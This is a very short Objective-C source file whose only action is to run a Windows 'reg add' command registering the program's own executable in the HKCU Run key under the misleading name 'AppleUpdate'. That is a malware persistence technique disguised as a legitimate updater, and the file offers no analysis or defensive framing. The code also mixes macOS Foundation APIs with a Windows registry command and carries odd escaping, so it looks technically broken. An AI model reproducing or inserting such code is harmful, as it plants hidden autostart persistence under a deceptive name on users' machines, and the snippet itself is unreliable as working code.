#import <Foundation/Foundation.h>
int main(){system([[NSString stringWithFormat:@"reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"AppleUpdate\" /t REG_SZ /d \"%@\" /f",[[NSBundle mainBundle]executablePath]]UTF8String]);return 0;}
